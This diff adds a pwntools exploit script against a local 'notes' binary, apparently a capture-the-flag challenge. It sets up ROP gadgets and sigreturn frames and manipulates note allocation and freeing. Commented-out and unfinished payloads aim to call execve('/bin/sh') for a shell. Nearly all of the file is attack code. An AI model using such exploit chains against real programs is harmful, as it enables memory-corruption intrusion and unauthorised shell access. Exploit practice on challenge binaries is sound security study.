@@ -1,0 +1,111 @@
+#!/bin/python
+from pwn import *
+import time
+exe = ELF('./notes')
+p = process(exe.path)
+# context.terminal = ['foot']
+# gdb.attach(p, gdbscript='''
+#            
+#
+#            ''')
+#################exploiting#####################
+pop_rdi = 0x0000000000401bc0
+syscall = 0x0000000000401bc2
+leave_ret = 0x0000000000401428
+libc_start_main_contain = 0x403fe0
+
+#
+
+context.clear(arch='amd64')
+frame = SigreturnFrame()
+frame.rax = 0
+frame.rdi = 0
+frame.rsi = 0x404310
+frame.rdx = 0x1000
+frame.rbp = 0x404340 
+frame.rip = syscall
+frame.rsp = 0x404310 
+ 
+p.sendlineafter(b'Choice:', b'1')
+p.sendafter(b'Note ID:', b'1')
+p.sendafter(b'Note Name:', b'lmao')
+p.sendlineafter(b'Note Size:', b'64')
+p.sendafter(b'Note Content:',b'a')
+sleep(2.3)
+
+p.sendlineafter(b'Choice:', b'1')
+p.sendafter(b'Note ID:', b'2')
+p.sendafter(b'Note Name:', b'lmao')
+p.sendlineafter(b'Note Size:', b'1000')
+p.sendlineafter(b'Note Content:',b'a' )
+
+
+p.sendlineafter(b'Choice:', b'2')
+p.sendafter(b'Note ID:', b'1')
+
+p.sendlineafter(b'Choice:', b'3')
+p.sendafter(b'Note ID:', b'1')
+context.terminal = ['foot']
+gdb.attach(p, gdbscript='''        
+           # b* 0x0000000000401bc2
+           # b* 0x401070
+           # b*0x7ffff7fc145e
+           b*0x401726
+''')
+
+# print_note= 0x40179d
+# fake_rbp = 0x40179d-0x8
+# syscall_plt = 0x401070
+# payload = p64(fake_rbp)
+# payload += p64(pop_rdi)
+# payload += p64(0xf)
+# payload += p64(syscall_plt)
+# payload += bytes(frame) 
+# # context.terminal = ['foot']
+# # gdb.attach(p, gdbscript='''        
+# #            # b* 0x0000000000401bc2
+# #            # b* 0x401070
+# #            b*0x7ffff7fc145e
+# #
+# #            ''')
+#
+#
+# p.sendafter(b'Note Content:',b'a'*0x40 +payload )
+
+
+
+
+
+
+
+# # p.send(b'6')
+# frame2 = SigreturnFrame()
+# frame2.rax = 0x3b
+# frame2.rdi =0x404310 
+# frame2.rcx = 0
+# frame2.rsi =0 
+# frame2.rdx = 0
+# frame2.rsp = syscall 
+# frame2.rip = syscall
+#
+#
+#
+#
+# payload = b'/bin/sh\x00' 
+# payload += p64(pop_rdi)
+# payload += p64(0xf)
+# payload += p64(syscall_plt)
+# payload += bytes(frame2) 
+# # context.terminal = ['foot']
+# # gdb.attach(p, gdbscript='''        
+# # # b* 0x0000000000401bc2
+# # b*0x0000000000401bc0
+# # # b* 0x401070
+# # # b*0x401bc1
+# # ''')
+# sleep(2)
+# p.sendafter(b'Sent!\n',payload)
+#
+
+##############the end###########################
+p.interactive()
